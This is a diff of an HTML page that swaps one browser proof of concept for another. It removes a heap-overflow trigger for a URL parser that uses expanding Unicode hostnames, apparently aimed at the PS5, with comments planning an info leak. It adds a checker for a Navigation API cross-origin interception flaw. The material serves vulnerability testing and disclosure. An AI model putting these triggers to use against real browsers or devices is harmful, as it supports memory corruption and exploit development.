@@ -1,106 +1,102 @@
-<!DOCTYPE html>
-<html>
-<head>
+<!doctype html>
+<html lang="en">
 <meta charset="utf-8">
-<title>PS5 CVE-2025-43429 - ICU URL Parser Overflow</title>
-</head>
-<body>
-<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2026-20643 minimal PoC</title>
+<style>
+  body { font: 14px/1.4 ui-monospace, Menlo, Consolas, monospace; margin: 20px; }
+  button { padding: 8px 12px; font-size: 14px; }
+  pre { background: #111; color: #ddd; padding: 12px; white-space: pre-wrap; min-height: 140px; }
+  #verdict { font-size: 20px; font-weight: bold; margin-top: 12px; padding: 12px; display: none; }
+  #verdict.vuln  { background: #3a0000; color: #ff4444; }
+  #verdict.safe  { background: #003a00; color: #44ff44; }
+</style>
+<h1>CVE-2026-20643 PoC</h1>
+<p>Tests whether <code>NavigateEvent.canIntercept</code> is incorrectly <code>true</code> for cross-port navigations.</p>
+<button id="run" type="button">Run PoC</button>
+<div id="verdict"></div>
+<pre id="out"></pre>
 <script>
-const L = s => { document.getElementById('log').textContent += s + '\n'; };
+(() => {
+  const out = document.getElementById("out");
+  const verdict = document.getElementById("verdict");
+  const log = (s) => { out.textContent += s + "\n"; };
 
-L('[*] Starting CVE-2025-43429 ICU URL Parser Overflow test...');
-
-// Characters that expand massively during IDNA normalization (Unicode to ASCII Punycode)
-// \uFDFA expands to ~18 characters
-// \u212B expands to "A" + combining ring
-// \uFB01 expands to "fi"
-
-const expanders = [
-    '\uFDFA', // ARABIC LIGATURE SALLALLAHOU ALAYHE WASALLAM
-    '\u212B', // ANGSTROM SIGN
-    '\uFB01', // LATIN SMALL LIGATURE FI
-    '\uFB03', // LATIN SMALL LIGATURE FFI
-    '\u3371', // SQUARE HPA
-    '\uFB00', // LATIN SMALL LIGATURE FF
-];
-
-// Test 1: Direct URL constructor with expanding characters
-L('\n--- Test 1: URL Constructor with expanding domain ---');
-for (let i = 0; i < expanders.length; i++) {
-    try {
-        // Build a domain like: http://[expander x100].com
-        let domain = expanders[i].repeat(100) + '.com';
-        let url = new URL('http://' + domain);
-        
-        // If we reach here without crashing, check if the hostname was truncated or corrupted
-        L('[+] Expander ' + i + ': URL parsed. Hostname length: ' + url.hostname.length);
-        
-        // Check for memory corruption in the hostname string
-        let anomalous = false;
-        for (let j = 0; j < url.hostname.length; j++) {
-            let code = url.hostname.charCodeAt(j);
-            // Punycode starts with xn--
-            // If we see non-ASCII or control chars, memory is corrupted
-            if (code > 127 || (code < 32 && code !== 45)) { // 45 is '-'
-                L('[!] ANOMALY at index ' + j + ': 0x' + code.toString(16));
-                anomalous = true;
-                break;
-            }
-        }
-        if (anomalous) {
-            L('[!] Hostname contains corrupted data! Possible heap leak!');
-            L('[!] Hostname: ' + url.hostname);
-        }
-    } catch (e) {
-        L('[!] Expander ' + i + ' threw: ' + e.message);
+  function setVerdict(vuln) {
+    verdict.style.display = "block";
+    if (vuln) {
+      verdict.className = "vuln";
+      verdict.textContent = "VULNERABLE — canIntercept=true on cross-origin target (CVE-2026-20643)";
+    } else {
+      verdict.className = "safe";
+      verdict.textContent = "PATCHED — canIntercept=false as expected";
     }
-}
+  }
 
-// Test 2: Massive expansion to guarantee overflow
-L('\n--- Test 2: Massive Expansion (1000x) ---');
-try {
-    // \uFDFA repeats 1000 times -> expands to ~18000 chars
-    // If hostnameBuffer is only 1024 bytes, this will overflow by 17000 bytes
-    let domain = '\uFDFA'.repeat(1000) + '.com';
-    let url = new URL('http://' + domain);
-    L('[+] Massive URL parsed. Hostname length: ' + url.hostname.length);
-    L('[+] Hostname (first 100 chars): ' + url.hostname.substring(0, 100));
-} catch (e) {
-    L('[!] Massive test threw: ' + e.message);
-}
+  function defaultCrossPortTarget() {
+    const u = new URL(location.href);
+    const port = u.port || (u.protocol === "https:" ? "443" : "80");
+    const other = port === "8800" ? "8000" : "8800";
+    return `${u.protocol}//${u.hostname}:${other}/`;
+  }
 
-// Test 3: Anchor element href parsing (different code path)
-L('\n--- Test 3: Anchor href parsing ---');
-try {
-    const a = document.createElement('a');
-    a.href = 'http://' + '\uFDFA'.repeat(500) + '.com';
-    
-    // Force layout/style resolution to trigger the parser
-    void a.offsetWidth;
-    
-    L('[+] Anchor href parsed. Hostname length: ' + a.hostname.length);
-    L('[+] Hostname: ' + a.hostname.substring(0, 100));
-} catch (e) {
-    L('[!] Anchor test threw: ' + e.message);
-}
+  document.getElementById("run").addEventListener("click", () => {
+    out.textContent = "";
+    verdict.style.display = "none";
 
-// Test 4: Mixed expanders to hit boundary conditions exactly
-L('\n--- Test 4: Boundary Condition (64 bytes) ---');
-try {
-    // Try to hit the exact buffer size (e.g., 256 bytes)
-    // \uFDFA expands to 18 bytes. 256 / 18 ≈ 14.
-    // 14 * \uFDFA = 14 chars input -> 252 bytes output. 
-    // Add a few normal chars to push it over 256.
-    let domain = '\uFDFA'.repeat(15) + 'aaaa.com';
-    let url = new URL('http://' + domain);
-    L('[+] Boundary URL parsed. Hostname length: ' + url.hostname.length);
-} catch (e) {
-    L('[!] Boundary test threw: ' + e.message);
-}
+    if (!window.navigation) {
+      log("Inconclusive: window.navigation unavailable.");
+      return;
+    }
 
-L('\n[*] If the browser did not crash, the overflow might be silently corrupting heap memory.');
-L('[*] We can use this to corrupt a JSObject length field to build an info leak!');
+    const target = new URL(defaultCrossPortTarget(), location.href);
+    const crossOrigin = target.origin !== location.origin;
+    log(`from:         ${location.href}`);
+    log(`to:           ${target.href}`);
+    log(`cross-origin: ${crossOrigin}`);
+    log("");
+
+    let hit = false;
+    const onNavigate = (event) => {
+      if (event.destination?.url !== target.href)
+        return;
+      hit = true;
+
+      log(`canIntercept: ${event.canIntercept}`);
+
+      if (crossOrigin && event.canIntercept) {
+        try {
+          event.intercept({
+            handler() {
+              log("intercept() handler ran on cross-origin target");
+            }
+          });
+        } catch (e) {
+          log(`intercept() threw: ${e}`);
+        }
+        setVerdict(true);
+      } else {
+        event.preventDefault();
+        setVerdict(false);
+      }
+    };
+
+    navigation.addEventListener("navigate", onNavigate, { once: true });
+
+    const a = document.createElement("a");
+    a.href = target.href;
+    a.rel = "noreferrer";
+    a.style.display = "none";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+
+    setTimeout(() => {
+      if (!hit) {
+        log("Inconclusive: no matching navigate event observed.");
+      }
+    }, 1200);
+  });
+})();
 </script>
-</body>
 </html>
